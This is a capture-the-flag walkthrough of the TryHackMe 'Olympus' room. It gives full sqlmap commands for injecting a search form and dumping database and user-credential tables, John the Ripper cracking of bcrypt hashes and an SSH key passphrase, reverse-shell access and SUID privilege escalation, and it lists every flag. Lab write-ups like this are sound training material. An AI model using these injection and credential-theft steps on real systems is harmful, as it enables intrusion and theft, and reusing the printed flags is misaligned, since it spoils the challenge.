# Olympus

**Platform:** TryHackMe  
**Date:** 2026-08-21  
**Difficulty:** Medium
**Category:** Linux / Web / SQL Injection / Privilege Escalation  
**Room URL:** https://tryhackme.com/room/olympusroom
**Status:** ✅ Completed

---

## 📌 What Was This Room About?

> Olympus was a Linux web application challenge involving SQL injection, credential discovery, a reverse shell, SSH key cracking, and multiple stages of privilege escalation. 
---

## 🔍 Reconnaissance

### Nmap Scan

The Nmap scan showed two open ports:

```bash
nmap -sV -sC -oN nmap_output.txt <MACHINE_IP>
```

**Results:**

|Port|Service|Version|Notes|
|---|---|---|---|
|22|SSH|OpenSSH|SSH access|
|80|HTTP|HTTP|Web application|

With port 80 open, the next obvious step was to check the website.

### Web Enumeration

Opening the IP address in the browser gave us an error and redirected me to:

```text
olympus.thm
```

So I added the hostname to `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

After that, the website loaded normally.

There wasn't much immediately interesting on the main page, so I moved on to directory enumeration.

### Gobuster

```bash
gobuster dir -u http://olympus.thm -w /usr/share/wordlists/dirb/common.txt
```

One directory immediately caught my attention:

```text
/~webmaster
```

So that's where I started digging.

---

## 🧭 Steps I Took

### Step 1 — Finding the SQL Injection

- **What I did:** Opened the `~webmaster` directory and checked out the search functionality.
    
- **Command/Tool used:** Browser
    

The search page behaved strangely when I entered certain SQL-related input. Instead of handling the input normally, it returned an error.

That was enough to make me suspicious that the search parameter wasn't being properly validated or sanitized.

So naturally, I started testing for SQL injection.

---

### Step 2 — Using SQLMap

- **What I did:** Rather than manually extracting the database, I used SQLMap to automate the SQL injection.
    
- **Command/Tool used:**
    

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" \
--data="search=1337*&submit=" \
--dbs \
--random-agent \
-v 3 \
--batch
```

I used `--batch` so SQLMap would automatically answer its prompts instead of making me confirm every question.

The scan worked and revealed several databases.

One of them was:

```text
olympus
```

That looked interesting, so I moved on to enumerating its tables.

---

### Step 3 — Enumerating the Olympus Database

- **What I did:** Used SQLMap to enumerate the tables inside the `olympus` database.
    
- **Command/Tool used:**
    

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" \
--data="search=1337*&submit=" \
-D olympus \
--tables \
--random-agent \
-v 3 \
--batch
```

The database contained several tables, including:

```text
flag
users
chats
```

The `flag` table seemed like the obvious place to start. 😂

---

### Step 4 — Getting Flag 1

- **What I did:** Enumerated the columns of the `flag` table and dumped its contents.
    
- **Command/Tool used:**
    

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" \
--data="search=1337*&submit=" \
-D olympus \
-T flag \
--columns \
--random-agent \
-v 3 \
--batch
```

After seeing the `flag` column, I dumped it:

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" \
--data="search=1337*&submit=" \
-D olympus \
-T flag \
-C flag \
--dump \
--random-agent \
-v 3 \
--batch
```

And there it was:

```text
flag{Sm4rt!_k33P_d1gGIng}
```

🚩 **Flag 1 found.**

---

### Step 5 — Dumping the User Credentials

- **What I did:** Since there was also a `users` table, I wanted to see what information was stored inside it.
    
- **Command/Tool used:**
    

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" \
--data="search=1337*&submit=" \
-D olympus \
-T users \
--columns \
--random-agent \
-v 3 \
--batch
```

The table contained fields including:

```text
user_name
user_password
randsalt
user_role
```

So I dumped those values:

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" \
--data="search=1337*&submit=" \
-D olympus \
-T users \
-C "user_name,user_password,randsalt,user_role" \
--dump \
--random-agent \
-v 3 \
--batch
```

The passwords were stored as hashes.

One of them started with:

```text
$2y$
```

That told me it was a **bcrypt** hash.

---

### Step 6 — Cracking the Password

- **What I did:** Used John the Ripper with the `rockyou.txt` wordlist to crack the bcrypt hash.
    
- **Command/Tool used:**
    

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes --format=bcrypt
```

John managed to crack the password.

Now I just needed to figure out where I could actually use it.

---

### Step 7 — Finding the Chat Subdomain

I spent a while trying to figure out where the credentials could be useful.

Looking back through the information from the `users` table, I noticed another domain:

```text
chat.olympus.thm
```

So I added that to `/etc/hosts` as well.

After visiting it, I found a login page.

I tried the usernames from the database with the password I had cracked.

Eventually, the password worked with the **Prometheus** account.

Now we had access to the chat application.

---

### Step 8 — Getting a Reverse Shell

- **What I did:** Used the chat functionality to send a reverse-shell payload.
    
- **Command/Tool used:** Chat application + reverse shell
    

Once the shell connected back, I had access to the machine.

The next problem was figuring out where the shell payload had actually been saved.

Looking back at the SQL injection results, I remembered that there was a table called:

```text
chats
```

So I went back to the database and inspected it.

The chat messages revealed where the file was being stored.

I then located the file and triggered it, which gave me a shell on the target.

🚩 After getting access to the machine, I found **Zeus' flag**:

```text
flag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}
```

**Flag 2 found.** ⚡

---

## 🔐 Privilege Escalation

### Step 9 — Running LinPEAS

Now that I had a shell, it was time to figure out how to escalate.

I transferred `linpeas` onto the machine and ran it to look for interesting permissions, binaries, credentials, and other possible escalation paths.

```bash
./linpeas.sh
```

One thing that stood out was an unusual binary that I had permission to interact with.

There was also a `cpuitls` binary available to me, so I started investigating that.

---

### Step 10 — Stealing Zeus' SSH Key

While checking the files I could access, I remembered that Zeus' home directory contained an SSH directory.

I found an SSH private key and realised that I could copy it to my own machine.

The key was protected with a passphrase, though.

So I used `ssh2john` to convert the key into a format John could crack:

```bash
ssh2john id_rsa > id_rsa.hash
```

Then I ran John against it:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

And we got the passphrase:

```text
snowflake
```

Nice. 😏

I could now use the SSH key to log in as Zeus.

```bash
ssh -i id_rsa zeus@<MACHINE_IP>
```

Now I had a proper shell as:

```text
zeus
```

---

## 🚨 Privilege Escalation — Root

### Step 11 — Finding the SUID Binary

Now that I was Zeus, I went back to the files that I couldn't access earlier.

One of the interesting findings was an unusual **SUID binary**.

I tried executing it to see what it did.

After investigating its behaviour, I was able to abuse it to escalate my privileges.

And just like that:

```text
root
```

BOOM. 💀

🚩 **Flag 3 found:**

```text
flag{D4mN!_Y0u_G0T_m3_:)_}
```

---

### Step 12 — Finding the Final Flag

With root access, finding the last flag was easy.

I searched the filesystem for the flag using `grep`.

One way was with a recursive case-insensitive search:

```bash
grep -ri "flag{" /
```

Where:

- `-i` = ignore case
    
- `-r` = recursive search
    

This let me search through the filesystem for the remaining flag.

And finally:

```text
flag{Y0u_G0t_m3_g00d!}
```

🚩 **Flag 4 found.**

---

## 🛠 Commands Used

|Command|What It Does|
|---|---|
|`nmap -sV -sC ...`|Scans the target and identifies services|
|`gobuster dir ...`|Enumerates web directories|
|`sqlmap ... --dbs`|Enumerates databases through SQL injection|
|`sqlmap ... --tables`|Enumerates tables in a database|
|`sqlmap ... --dump`|Extracts database contents|
|`john --wordlist=... --format=bcrypt`|Cracks bcrypt password hashes|
|`ssh2john id_rsa`|Converts an SSH private key into a John-compatible hash|
|`john --wordlist=... id_rsa.hash`|Cracks the SSH key passphrase|
|`ssh -i id_rsa zeus@<IP>`|Connects to the target using Zeus' SSH key|
|`./linpeas.sh`|Searches the system for privilege-escalation opportunities|
|`grep -ri "flag{" /`|Recursively searches the filesystem for flags|

---

## 🚩 Flags Found

|Flag|Value|
|---|---|
|Flag 1|`flag{Sm4rt!_k33P_d1gGIng}`|
|Flag 2|`flag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}`|
|Flag 3|`flag{D4mN!_Y0u_G0T_m3_:)_}`|
|Flag 4|`flag{Y0u_G0t_m3_g00d!}`|

---

## 📎 Resources Used

- TryHackMe — Olympus
    
- Nmap
    
- Gobuster
    
- SQLMap
    
- John the Ripper
    
- ssh2john
    
- LinPEAS
    
- RockYou wordlist
    

---
